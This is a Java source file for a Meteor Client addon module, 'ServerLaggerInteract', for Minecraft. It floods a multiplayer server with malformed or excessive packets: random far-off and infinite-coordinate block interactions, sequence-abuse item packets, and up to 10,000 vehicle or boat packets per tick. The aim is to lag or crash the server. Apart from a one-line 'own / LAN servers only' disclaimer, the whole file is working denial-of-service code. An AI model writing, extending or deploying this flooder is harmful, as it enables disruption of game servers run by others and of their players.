package com.codigohasta.addon.modules;

import com.codigohasta.addon.AddonTemplate;
import java.util.Random;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent.Pre;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.EnumSetting.Builder;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.PendingUpdateManager;
import net.minecraft.client.network.SequencedPacketCreator;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.screen.sync.ItemStackHash;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class ServerLaggerInteract extends Module {
   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
   private final Setting<ServerLaggerInteract.Mode> mode = this.sgGeneral
      .add(
         ((Builder)((Builder)((Builder)new Builder().name("mode")).description("Which interaction based lag method to use."))
               .defaultValue(ServerLaggerInteract.Mode.InteractNoCom))
            .build()
      );
   private final Setting<Integer> vehiclePackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("vehicle-packets"))
                     .description("Packets per tick for the vehicle / boat modes."))
                  .defaultValue(2000))
               .min(100)
               .max(10000)
               .sliderMin(100)
               .sliderMax(10000)
               .visible(() -> this.mode.get() == ServerLaggerInteract.Mode.Vehicle || this.mode.get() == ServerLaggerInteract.Mode.Boat))
            .build()
      );
   private final Setting<Integer> interactPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("interact-packets"))
                     .description("Packets per tick for the interact modes."))
                  .defaultValue(15))
               .min(1)
               .max(100)
               .sliderMin(1)
               .sliderMax(100)
               .visible(() -> this.mode.get() == ServerLaggerInteract.Mode.InteractNoCom || this.mode.get() == ServerLaggerInteract.Mode.InteractItem))
            .build()
      );
   private final Setting<Integer> sequencePackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("sequence-packets"))
                     .description("Packets per tick for the sequenced-interact modes."))
                  .defaultValue(200))
               .min(50)
               .max(2000)
               .sliderMin(50)
               .sliderMax(2000)
               .visible(() -> this.mode.get() == ServerLaggerInteract.Mode.SequenceBlock || this.mode.get() == ServerLaggerInteract.Mode.SequenceItem))
            .build()
      );
   private final Setting<Boolean> autoDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("auto-disable"))
                  .description("Disable the module when you join or leave a world."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Boolean> smartDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("smart-disable"))
                  .description("Automatically disable the module when a mode finishes or errors out."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Integer> delay = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                     .name("delay"))
                  .description("Ticks to wait between bursts of packets."))
               .defaultValue(1))
            .min(0)
            .max(100)
            .sliderMin(0)
            .sliderMax(100)
            .build()
      );
   private int ticks = 0;

   public ServerLaggerInteract() {
      super(
         AddonTemplate.OP_CATEGORY,
         "ServerLaggerInteract",
         "Spams the server with interaction-flood packets (item-use, block-interact, vehicle / boat). Testing on your own / LAN servers only."
      );
   }

   @EventHandler
   private void onTick(Pre event) {
      if (this.mc.player != null && this.mc.world != null) {
         this.ticks++;
         if (this.ticks > (Integer)this.delay.get()) {
            this.ticks = 0;
            switch ((ServerLaggerInteract.Mode)this.mode.get()) {
               case InteractItem:
                  for (int i = 0; i < this.interactPackets.get(); i++) {
                     this.sendSequencedPacket(
                        id -> new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, id, this.mc.player.getYaw(), this.mc.player.getPitch())
                     );
                  }
                  break;
               case InteractNoCom:
                  for (int i = 0; i < this.interactPackets.get(); i++) {
                     Vec3d cpos = this.pickRandomPos();
                     this.mc
                        .getNetworkHandler()
                        .sendPacket(
                           new PlayerInteractBlockC2SPacket(
                              Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false), 0
                           )
                        );
                  }
                  break;
               case InteractOOB:
                  Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
                  this.mc
                     .getNetworkHandler()
                     .sendPacket(
                        new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0)
                     );
                  break;
               case Vehicle:
                  Entity vehicle = this.mc.player.getVehicle();
                  if (vehicle == null) {
                     if ((Boolean)this.smartDisable.get()) {
                        this.disable();
                     }

                     return;
                  }

                  BlockPos start = this.mc.player.getBlockPos();
                  Vec3d end = new Vec3d(start.getX() + 0.5, start.getY() + 1, start.getZ() + 0.5);
                  vehicle.updatePosition(end.x, end.y - 1.0, end.z);

                  for (int i = 0; i < this.vehiclePackets.get(); i++) {
                     this.mc.getNetworkHandler().sendPacket(VehicleMoveC2SPacket.fromVehicle(vehicle));
                  }
                  break;
               case Boat:
                  Entity vehicle = this.mc.player.getVehicle();
                  if (vehicle == null) {
                     if ((Boolean)this.smartDisable.get()) {
                        this.disable();
                     }

                     return;
                  }

                  if (!(vehicle instanceof BoatEntity)) {
                     if ((Boolean)this.smartDisable.get()) {
                        this.disable();
                     }

                     return;
                  }

                  for (int i = 0; i < this.vehiclePackets.get(); i++) {
                     this.mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(true, true));
                  }
                  break;
               case SequenceBlock:
                  Vec3d pos = new Vec3d(this.mc.player.getX(), this.mc.player.getY(), this.mc.player.getZ());
                  BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);

                  for (int i = 0; i < this.sequencePackets.get(); i++) {
                     this.mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                  }
                  break;
               case SequenceItem:
                  for (int i = 0; i < this.sequencePackets.get(); i++) {
                     this.sendSequencedPacket(
                        id -> new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, id, this.mc.player.getYaw(), this.mc.player.getPitch())
                     );
                  }
            }
         }
      } else {
         if ((Boolean)this.autoDisable.get()) {
            this.disable();
         }
      }
   }

   @EventHandler
   private void onGameJoined(GameJoinedEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   @EventHandler
   private void onGameLeft(GameLeftEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   private Vec3d pickRandomPos() {
      return new Vec3d(new Random().nextInt(16777215), 255.0, new Random().nextInt(16777215));
   }

   public void sendSequencedPacket(SequencedPacketCreator packetCreator) {
      if (this.mc.getNetworkHandler() != null && this.mc.world != null) {
         PendingUpdateManager pendingUpdateManager = this.mc.world.getPendingUpdateManager().incrementSequence();

         try {
            int i = pendingUpdateManager.getSequence();
            this.mc.getNetworkHandler().sendPacket(packetCreator.predict(i));
         } catch (Throwable var6) {
            if (pendingUpdateManager != null) {
               try {
                  pendingUpdateManager.close();
               } catch (Throwable var5) {
                  var6.addSuppressed(var5);
               }
            }

            throw var6;
         }

         if (pendingUpdateManager != null) {
            pendingUpdateManager.close();
         }
      }
   }

   private static ItemStackHash hashOf(ItemStack stack) {
      return ItemStackHash.fromItemStack(stack, c -> 0);
   }

   public void onDeactivate() {
      this.ticks = 999;
   }

   public static enum Mode {
      InteractItem,
      InteractNoCom,
      InteractOOB,
      Vehicle,
      Boat,
      SequenceBlock,
      SequenceItem;
   }
}
